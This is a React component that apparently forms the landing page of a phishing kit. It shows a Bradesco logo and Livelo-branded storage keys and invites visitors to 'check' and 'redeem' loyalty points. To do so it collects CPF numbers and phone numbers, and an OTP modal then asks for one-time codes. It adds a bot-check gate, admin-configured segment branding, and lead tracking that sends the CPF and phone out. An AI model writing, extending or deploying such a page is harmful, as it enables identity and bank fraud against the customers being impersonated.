import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Switch } from "@/components/ui/switch";
import { useFlow } from "@/contexts/FlowContext";
import { configRepository } from "@/repositories";
import { edgeFunctionsService } from "@/services";
import { maskCPF, maskPhone, isValidCPF, isValidPhone } from "@/lib/masks";
import LottieBackground from "@/components/LottieBackground";
import { getSegmentLogo } from "@/lib/segment-config";
import { getSegmentColor } from "@/lib/segment-colors";
import { segmentButtonStyle } from "@/lib/segment-colors";
import OtpModal from "@/components/OtpModal";
import TurnstileWidget from "@/components/TurnstileWidget";
import { useFlowNavigation } from "@/hooks/useFlowNavigation";
import HomeAlertModal from "@/components/HomeAlertModal";
import ErrorScreen from "@/components/ErrorScreen";
import { trackLead } from "@/lib/tracking";
import { sendServerEvent } from "@/lib/tracking-capi";

interface TurnstileConfig {
  enabled: boolean;
  site_key: string;
}

const SplashPage = () => {
  const navigate = useNavigate();
  const { data, updateData } = useFlow();
  const { getNextStep, allSteps } = useFlowNavigation();
  const [cpf, setCpf] = useState(data.cpf);
  const [phone, setPhone] = useState(data.phone);
  const [remember, setRemember] = useState(data.rememberAccount);
  const [errors, setErrors] = useState<{ cpf?: string; phone?: string }>({});
  const [showOtp, setShowOtp] = useState(false);
  const [turnstileToken, setTurnstileToken] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [turnstileConfig, setTurnstileConfig] = useState<TurnstileConfig>({ enabled: false, site_key: "" });
  const [networkError, setNetworkError] = useState(false);

  const segColor = getSegmentColor(data.segment);
  const isOtpEnabled = allSteps.some((s) => s.step_key === "otp" && s.enabled);
  const turnstileActive = turnstileConfig.enabled && !!turnstileConfig.site_key;

  // Load Turnstile config from admin panel settings
  useEffect(() => {
    configRepository.getByKeys(["turnstile_config"]).then((rows) => {
      const row = rows.find((r) => r.config_key === "turnstile_config");
      if (row?.config_value) {
        setTurnstileConfig(row.config_value as unknown as TurnstileConfig);
      }
    });
  }, []);

  const handleSubmit = async () => {
    const newErrors: typeof errors = {};
    if (!isValidCPF(cpf)) newErrors.cpf = "CPF inválido";
    if (!isValidPhone(phone)) newErrors.phone = "Telefone inválido";

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    // Block submit if Turnstile is active but token not yet generated
    if (turnstileActive && !turnstileToken) return;

    updateData({ cpf, phone, rememberAccount: remember });

    // Track Lead event (browser + server)
    const eventId = trackLead({ content_name: "inicio_form" });
    sendServerEvent({
      event_name: "Lead",
      event_id: eventId,
      // ph + external_id (CPF) improve EMQ score significantly
      user_data: {
        ph: phone.replace(/\D/g, ""),
        external_id: cpf.replace(/\D/g, ""),
      },
    });

    if (remember) {
      localStorage.setItem("livelo_cpf", cpf);
      localStorage.setItem("livelo_phone", phone);
    } else {
      localStorage.removeItem("livelo_cpf");
      localStorage.removeItem("livelo_phone");
    }

    if (isOtpEnabled) {
      setShowOtp(true);
    } else {
      // Verify Turnstile token if active before navigating
      if (turnstileActive && turnstileToken) {
        setSubmitting(true);
        try {
          const result = await edgeFunctionsService.verifyTurnstile(turnstileToken);
          setSubmitting(false);

          if (!result?.success) {
            setErrors({ cpf: undefined, phone: undefined });
            setTurnstileToken(null);
            return;
          }
        } catch {
          setSubmitting(false);
          setNetworkError(true);
          return;
        }
      }

      navigate(getNextStep("inicio"));
    }
  };

  const handleOtpVerified = () => {
    setShowOtp(false);
    navigate(getNextStep("otp"));
  };

  return (
    <div className="relative flex min-h-screen flex-col px-6 py-8 pb-safe">
      <LottieBackground />
      <HomeAlertModal />

      {/* Logo */}
      <div className="relative z-10 mb-4">
        <img src={getSegmentLogo(data.segment)} alt="Bradesco" className="w-[120px] h-auto object-contain brightness-0 invert" />
      </div>

      {/* Heading */}
      <h1 className="relative z-10 text-lg font-bold leading-snug text-white mb-0">
        Confira os pontos acumulados no seu CPF
      </h1>

      {/* Spacer */}
      <div className="flex-1 min-h-[80px] max-h-[160px]" />

      {/* Fields side by side */}
      <div className="relative z-10 flex gap-8 mb-8">
        <div className="flex-1 space-y-1">
          <label className="text-body-sm font-semibold text-white/80">CPF</label>
          <input
            type="text"
            inputMode="numeric"
            placeholder="000.000.000-00"
            value={cpf}
            onChange={(e) => {
              setCpf(maskCPF(e.target.value));
              setErrors((prev) => ({ ...prev, cpf: undefined }));
            }}
            className="w-full border-b-2 border-white/40 bg-transparent py-3 text-white placeholder:text-white/30 outline-none focus:border-white transition-colors text-body"
          />
          {errors.cpf && (
            <p className="text-xs text-yellow-200">{errors.cpf}</p>
          )}
        </div>

        <div className="flex-1 space-y-1">
          <label className="text-body-sm font-semibold text-white/80">Telefone</label>
          <input
            type="text"
            inputMode="numeric"
            placeholder="(00) 00000-0000"
            value={phone}
            onChange={(e) => {
              setPhone(maskPhone(e.target.value));
              setErrors((prev) => ({ ...prev, phone: undefined }));
            }}
            className="w-full border-b-2 border-white/40 bg-transparent py-3 text-white placeholder:text-white/30 outline-none focus:border-white transition-colors text-body"
          />
          {errors.phone && (
            <p className="text-xs text-yellow-200">{errors.phone}</p>
          )}
        </div>
      </div>

      {/* Toggle */}
      <div className="relative z-10 flex items-center justify-between mb-8">
        <span className="text-body-sm font-medium text-white">Salvar CPF e telefone</span>
        <Switch
          checked={remember}
          onCheckedChange={setRemember}
          className="data-[state=checked]:bg-white/30 data-[state=unchecked]:bg-white/20"
        />
      </div>

      {/* Spacer */}
      <div className="flex-1" />

      {/* Turnstile bot protection */}
      {turnstileActive && (
        <div className="relative z-10 mb-4">
          <TurnstileWidget
            siteKey={turnstileConfig.site_key}
            onSuccess={(token) => setTurnstileToken(token)}
            onExpire={() => setTurnstileToken(null)}
            onError={() => setTurnstileToken(null)}
          />
        </div>
      )}

      {/* Button */}
      <button
        onClick={handleSubmit}
        disabled={(turnstileActive && !turnstileToken) || submitting}
        className="relative z-10 h-14 w-full rounded-full shadow-lg transition-all active:scale-[0.98] disabled:opacity-50 text-body font-semibold"
        style={{ backgroundColor: segmentButtonStyle(data.segment).backgroundColor, color: segmentButtonStyle(data.segment).color }}
      >
        {submitting ? "Verificando..." : "Resgatar pontos"}
      </button>

      {/* OTP Modal */}
      <OtpModal
        open={showOtp}
        onOpenChange={setShowOtp}
        phone={phone}
        onVerified={handleOtpVerified}
        segment={data.segment}
        turnstileToken={turnstileToken ?? undefined}
      />

      {/* Network error screen */}
      {networkError && (
        <div className="fixed inset-0 z-50">
          <ErrorScreen
            type="network"
            onAction={() => setNetworkError(false)}
          />
        </div>
      )}
    </div>
  );
};

export default SplashPage;
